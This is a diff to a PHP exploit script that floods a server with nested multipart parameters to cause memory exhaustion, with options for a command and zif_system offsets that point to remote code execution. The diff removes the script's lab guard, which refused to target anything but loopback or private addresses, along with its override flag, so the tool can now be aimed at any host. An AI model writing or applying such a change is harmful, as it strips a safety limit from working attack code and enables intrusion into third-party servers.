@@ -20,7 +20,7 @@ error_reporting(E_ALL & ~E_DEPRECATED);
 $OPTS = getopt('', array(
   'host:', 'port:', 'cmd:', 'pads:', 'pad-len:', 'flood-mb:', 'flood-parts:',
   'cal-values:', 'max-cal-tries:', 'max-pl-tries:', 'offsets:',
-  'i-know-this-is-not-a-lab', 'check', 'help',
+  'check', 'help',
 ));
 if (isset($OPTS['help'])) { usage(); exit(0); }
 if (!count($OPTS) && $argc > 1) {
@@ -58,13 +58,6 @@ $CAL_VALUES  = isset($OPTS['cal-values']) ? (int)$OPTS['cal-values'] : 200;
 $MAX_CAL = isset($OPTS['max-cal-tries']) ? (int)$OPTS['max-cal-tries'] : 8;
 $MAX_PL  = isset($OPTS['max-pl-tries']) ? (int)$OPTS['max-pl-tries'] : 8;
 
-/* ---- lab guard: refuse non-private hosts unless explicitly overridden ---- */
-if (!host_is_lab($HOST) && !isset($OPTS['i-know-this-is-not-a-lab'])) {
-  fwrite(STDERR, "refusing to run against $HOST: not a loopback or private "
-    . "address. Pass --i-know-this-is-not-a-lab if this is your own lab.\n");
-  exit(2);
-}
-
 define('SID', 'e1');
 $NESTED = 'a[]' . str_repeat('[a]', 62);
 $GLOBALS['NESTED'] = $NESTED;
@@ -90,15 +83,6 @@ function usage() {
     . "  --max-cal-tries N --max-pl-tries N  retry budgets (default 8)\n"
     . "  --offsets f.json  ps_globals / zif_system overrides (see tools/derive-offsets.sh)\n"
     . "  --check           multipart shape self-test against the lab\n";
-}
-
-function host_is_lab($h) {
-  if ($h === 'localhost' || $h === '::1') return true;
-  if (preg_match('/^127\./', $h)) return true;
-  if (preg_match('/^10\./', $h)) return true;
-  if (preg_match('/^192\.168\./', $h)) return true;
-  if (preg_match('/^172\.(1[6-9]|2\d|3[01])\./', $h)) return true;
-  return false;
 }
 
 function self_check() {
@@ -267,6 +251,10 @@ function main() {
 
   echo "[*] A2: multipart flood OOM\n";
   $r = raw_request(a2_body(), $HOST, $PORT);
+  if (strpos($r, 'CONNFAIL:') === 0) {
+    fwrite(STDERR, "[!] cannot reach $HOST:$PORT (" . substr($r, 9) . ")\n");
+    exit(3);
+  }
   $bd = ($p = strpos($r, "\r\n\r\n")) !== false ? substr($r, $p + 4) : '';
   $oom = strpos($bd, 'Allowed memory size') !== false;
   echo "    resp_len=" . strlen($r) . " oom=" . ($oom ? 'YES' : 'no') . "\n";
